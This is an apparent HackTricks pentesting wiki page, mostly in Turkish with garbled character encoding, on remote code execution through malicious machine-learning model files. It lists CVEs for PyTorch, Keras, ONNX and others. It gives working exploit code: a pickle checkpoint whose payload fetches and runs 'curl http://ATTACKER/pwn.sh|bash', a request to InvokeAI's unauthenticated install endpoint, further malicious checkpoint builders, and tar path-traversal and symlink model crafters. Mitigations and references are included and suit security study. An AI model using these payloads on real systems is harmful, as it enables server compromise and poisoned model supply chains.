# Modeller RCE

{{#include ../banners/hacktricks-training.md}}

## Modelleri RCE'ye yÃ¼kleme

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch vb. farklÄ± formatlarda paylaÅŸÄ±lÄ±r. Bu modeller geliÅŸtirici makinelerine veya Ã¼retim sistemlerine yÃ¼klenip kullanÄ±labilir. Genellikle modeller kÃ¶tÃ¼ amaÃ§lÄ± kod iÃ§ermez, ancak bazÄ± durumlarda model, kasÄ±tlÄ± bir Ã¶zellik veya model yÃ¼kleme kÃ¼tÃ¼phanesindeki bir zafiyet nedeniyle sistemde rastgele kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±labilir.

YazÄ±m sÄ±rasÄ±nda bu tÃ¼r zafiyetlere bazÄ± Ã¶rnekler ÅŸunlardÄ±r:

| **Framework / AraÃ§**        | **Zafiyet (CVE varsa)**                                                    | **RCE VektÃ¶rÃ¼**                                                                                                                           | **Referanslar**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` iÃ§inde gÃ¼vensiz deserializasyon* **(CVE-2025-32434)**                                                              | Model checkpoint'indeki kÃ¶tÃ¼ amaÃ§lÄ± pickle kod Ã§alÄ±ÅŸtÄ±rmaya yol aÃ§ar ( `weights_only` korumasÄ±nÄ± atlar)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* â€“ **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kÃ¶tÃ¼ amaÃ§lÄ± model indirme kod Ã§alÄ±ÅŸtÄ±rmaya yol aÃ§ar; yÃ¶netim API'sinde Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` Ã¼zerinden gÃ¼vensiz checkpoint deserializasyonu **(CVE-2025-23298)**                                           | GÃ¼venilmeyen checkpoint `load_model_trainer_states_from_checkpoint` sÄ±rasÄ±nda pickle reducer tetikler â†’ ML worker'da kod Ã§alÄ±ÅŸtÄ±rma            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (gÃ¼vensiz YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML'den model yÃ¼klemek `yaml.unsafe_load` kullanÄ±yor (kod Ã§alÄ±ÅŸtÄ±rma) <br> **Lambda** katmanÄ±yla model yÃ¼klemek rastgele Python kodu Ã§alÄ±ÅŸtÄ±rÄ±r          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Kusurlu `.tflite` model tamsayÄ± taÅŸmasÄ±na neden olur â†’ heap bozulmasÄ± (potansiyel RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` ile model yÃ¼klemek, saldÄ±rganÄ±n `__reduce__` payload'unu iÃ§eren pickle'Ä± Ã§alÄ±ÅŸtÄ±rÄ±r                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (gÃ¼vensiz `np.load`) *tartÄ±ÅŸmalÄ±*                                                                              | VarsayÄ±lan olarak `numpy.load` pickled object array'lerine izin verir â€“ kÃ¶tÃ¼ amaÃ§lÄ± `.npy/.npz` kod Ã§alÄ±ÅŸtÄ±rma tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights yolu dizinden Ã§Ä±kabilir (rastgele dosyalarÄ± okuma) <br> KÃ¶tÃ¼ amaÃ§lÄ± ONNX model tar'Ä± rastgele dosyalarÄ± Ã¼zerine yazabilir (RCE'ye yol aÃ§abilir) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Custom operator iÃ§eren model, saldÄ±rganÄ±n native kodunu yÃ¼klemeyi gerektirebilir; karmaÅŸÄ±k model grafikleri, istenmeyen hesaplamalarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in mantÄ±ÄŸÄ± kÃ¶tÃ¼ye kullanabilir   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkin iken model-load API'sinin kullanÄ±lmasÄ±, dosya yazmak iÃ§in gÃ¶reli yol traversaline izin verir (Ã¶r. RCE iÃ§in `.bashrc` Ã¼zerine yazma)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 â€¦ 25668** (birden Ã§ok heap overflow)                                                                         | Bozuk GGUF model dosyasÄ±, ayrÄ±ÅŸtÄ±rÄ±cÄ±da heap buffer overflow'larÄ±na neden olup hedef sistemde rastgele kod Ã§alÄ±ÅŸtÄ±rmaya olanak saÄŸlar                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda katmanlÄ± kÃ¶tÃ¼ amaÃ§lÄ± HDF5 (`.h5`) model hÃ¢lÃ¢ yÃ¼klemede kod Ã§alÄ±ÅŸtÄ±rÄ±r (Keras safe_mode eski formatu kapsamaz â€“ â€œdowngrade attackâ€) | |
| **Others** (general)        | *TasarÄ±m hatasÄ±* â€“ Pickle serialization                                                                                         | BirÃ§ok ML aracÄ± (Ã¶rn. pickle-tabanlÄ± model formatlarÄ±, Python `pickle.load`) model dosyalarÄ±na gÃ¶mÃ¼len rastgele kodu mitigasyon yoksa Ã§alÄ±ÅŸtÄ±rÄ±r | |

AyrÄ±ca, [PyTorch](https://github.com/pytorch/pytorch/security) tarafÄ±ndan kullanÄ±lanlar gibi bazÄ± python pickle tabanlÄ± modeller, `weights_only=True` ile yÃ¼klenmezlerse sistemde rastgele kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±labilir. Bu yÃ¼zden, tabloda listelenmemiÅŸ olsalar bile herhangi bir pickle tabanlÄ± model bu tÃ¼r saldÄ±rÄ±lara Ã¶zellikle duyarlÄ± olabilir.

### ğŸ†• InvokeAI `torch.load` Ã¼zerinden RCE (CVE-2024-12029)

`InvokeAI` Stable-Diffusion iÃ§in popÃ¼ler bir aÃ§Ä±k kaynaklÄ± web arayÃ¼zÃ¼dÃ¼r. SÃ¼rÃ¼mler **5.3.1 â€“ 5.4.2** kullanÄ±cÄ±larÄ±n modelleri rastgele URL'lerden indirip yÃ¼klemesine izin veren `/api/v2/models/install` REST endpoint'ini aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.

Ä°Ã§eride endpoint eninde sonunda ÅŸu Ã§aÄŸrÄ±yÄ± yapar:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Ä°stismar adÄ±mlarÄ±

1. KÃ¶tÃ¼ amaÃ§lÄ± bir checkpoint oluÅŸturun:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. KontrolÃ¼nÃ¼zdeki bir HTTP sunucusunda `payload.ckpt` dosyasÄ±nÄ± barÄ±ndÄ±rÄ±n (Ã¶r. `http://ATTACKER/payload.ckpt`).
3. Zafiyetli endpoint'i tetikleyin (no authentication required):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false â†’ no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI dosyayÄ± indirdiÄŸinde `torch.load()` Ã§aÄŸrÄ±lÄ±r â†’ `os.system` gadget'Ä± Ã§alÄ±ÅŸÄ±r ve saldÄ±rgan InvokeAI sÃ¼recinin baÄŸlamÄ±nda kod yÃ¼rÃ¼tmeyi ele geÃ§irir.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` tÃ¼m akÄ±ÅŸÄ± otomatikleÅŸtirir.

#### KoÅŸullar

â€¢  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
â€¢  `/api/v2/models/install` saldÄ±rgan tarafÄ±ndan eriÅŸilebilir olmalÄ±  
â€¢  SÃ¼recin shell komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rma izni olmalÄ±

#### Ã–nlemler

* InvokeAI'yi **InvokeAI â‰¥ 5.4.3** sÃ¼rÃ¼mÃ¼ne yÃ¼kseltin â€“ yama varsayÄ±lan olarak `scan=True` ayarÄ± getirir ve deserialization Ã¶ncesinde kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±m taramasÄ± yapar.  
* Checkpoint'leri programatik olarak yÃ¼klerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) yardÄ±mcÄ± fonksiyonunu kullanÄ±n.  
* Model kaynaklarÄ± iÃ§in izin listeleri (allow-lists) / imzalar (signatures) uygulayÄ±n ve servisi en dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klarla Ã§alÄ±ÅŸtÄ±rÄ±n.

> âš ï¸ UnutmayÄ±n ki **herhangi bir** Python pickle tabanlÄ± format (Ã§ok sayÄ±da `.pt`, `.pkl`, `.ckpt`, `.pth` dosyasÄ± dahil) gÃ¼venilmeyen kaynaklardan deserialize edilmek iÃ§in doÄŸasÄ± gereÄŸi gÃ¼vensizdir.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### ğŸ†• NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA'nin Transformers4Rec'i (Merlin'in bir parÃ§asÄ±), kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan yollarda doÄŸrudan `torch.load()` Ã§aÄŸÄ±ran gÃ¼vensiz bir checkpoint yÃ¼kleyicisi aÃ§Ä±ÄŸa Ã§Ä±kardÄ±. Ã‡Ã¼nkÃ¼ `torch.load`, Python `pickle`'a dayanÄ±r; saldÄ±rgan kontrollÃ¼ bir checkpoint, deserializasyon sÄ±rasÄ±nda bir reducer aracÄ±lÄ±ÄŸÄ±yla rastgele kod Ã§alÄ±ÅŸtÄ±rabilir.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` â†’ `load_model_trainer_states_from_checkpoint(...)` â†’ `torch.load(...)`.

Why this leads to RCE: Python pickle'da bir obje, callable ve argÃ¼manlar dÃ¶ndÃ¼ren bir reducer (`__reduce__`/`__setstate__`) tanÄ±mlayabilir. Callable, unpickling sÄ±rasÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. BÃ¶yle bir obje bir checkpoint'te varsa, herhangi bir aÄŸÄ±rlÄ±k kullanÄ±lmadan Ã¶nce Ã§alÄ±ÅŸÄ±r.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Teslim vektÃ¶rleri ve etki alanÄ±:
- Trojanized checkpoints/models repos, buckets veya artifact registries aracÄ±lÄ±ÄŸÄ±yla paylaÅŸÄ±lan
- Checkpoint'larÄ± otomatik olarak yÃ¼kleyen resume/deploy pipeline'larÄ±
- Ã‡alÄ±ÅŸtÄ±rma, genellikle yÃ¼kseltilmiÅŸ ayrÄ±calÄ±klarla (Ã¶r. container'larda root) training/inference worker'larÄ± iÃ§inde gerÃ§ekleÅŸir

DÃ¼zeltme: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) doÄŸrudan `torch.load()` Ã§aÄŸrÄ±sÄ±nÄ± `transformers4rec/utils/serialization.py` iÃ§inde uygulanan kÄ±sÄ±tlÄ±, allow-listed bir deserializer ile deÄŸiÅŸtirdi. Yeni loader tÃ¼rleri/alanlarÄ± doÄŸrular ve yÃ¼kleme sÄ±rasÄ±nda keyfi callable'larÄ±n Ã§aÄŸrÄ±lmasÄ±nÄ± engeller.

PyTorch checkpoint'larÄ±na Ã¶zel savunma Ã¶nerileri:
- GÃ¼venilmeyen veriyi unpickle etmeyin. MÃ¼mkÃ¼nse [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi yÃ¼rÃ¼tÃ¼lebilir olmayan formatlarÄ± tercih edin.
- EÄŸer PyTorch serialization kullanmanÄ±z gerekiyorsa, `weights_only=True` (yeni PyTorch sÃ¼rÃ¼mlerinde desteklenir) ayarÄ±nÄ± saÄŸlayÄ±n veya Transformers4Rec yamasÄ±yla benzer ÅŸekilde custom allow-listed bir unpickler kullanÄ±n.
- Model kaynak/imzalarÄ±nÄ± zorunlu kÄ±lÄ±n ve deserializasyonu sandbox iÃ§inde yapÄ±n (seccomp/AppArmor; non-root kullanÄ±cÄ±; kÄ±sÄ±tlÄ± FS ve aÄŸ Ã§Ä±kÄ±ÅŸÄ± yok).
- Checkpoint yÃ¼kleme sÄ±rasÄ±nda ML servislerinden beklenmeyen child process'leri izleyin; `torch.load()`/`pickle` kullanÄ±mÄ±nÄ± trace edin.

POC ve vulnerable/patch referanslarÄ±:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Ã–rnek â€“ kÃ¶tÃ¼ amaÃ§lÄ± bir PyTorch modeli oluÅŸturma

- Modeli oluÅŸturun:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modeli yÃ¼kle:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# âš ï¸ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modellerde Path Traversal

Bu konuda [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiÄŸi gibi, farklÄ± AI framework'leri tarafÄ±ndan kullanÄ±lan model formatlarÄ±nÄ±n Ã§oÄŸu genellikle `.zip` gibi arÅŸiv tabanlÄ±dÄ±r. Bu nedenle, bu formatlarÄ± suistimal ederek path traversal attacks gerÃ§ekleÅŸtirmek ve modelin yÃ¼klendiÄŸi sistemden rastgele dosyalarÄ± okumak mÃ¼mkÃ¼n olabilir.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki kodla yÃ¼klendiÄŸinde `/tmp` dizininde bir dosya oluÅŸturacak bir model oluÅŸturabilirsiniz:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ya da, aÅŸaÄŸÄ±daki kod ile yÃ¼klendiÄŸinde `/tmp` dizinine bir symlink oluÅŸturacak bir model oluÅŸturabilirsiniz:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Derinlemesine: Keras .keras deserialization and gadget hunting

.Daha fazla bilgi iÃ§in .keras iÃ§ yapÄ±sÄ±, Lambda-layer RCE, â‰¤ 3.8'deki arbitrary import sorunu ve allowlist iÃ§indeki post-fix gadget discovery Ã¼zerine odaklanmÄ±ÅŸ bir rehber iÃ§in, bakÄ±n:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Kaynaklar

- [OffSec blog â€“ "CVE-2024-12029 â€“ InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch â€“ security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog â€“ CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
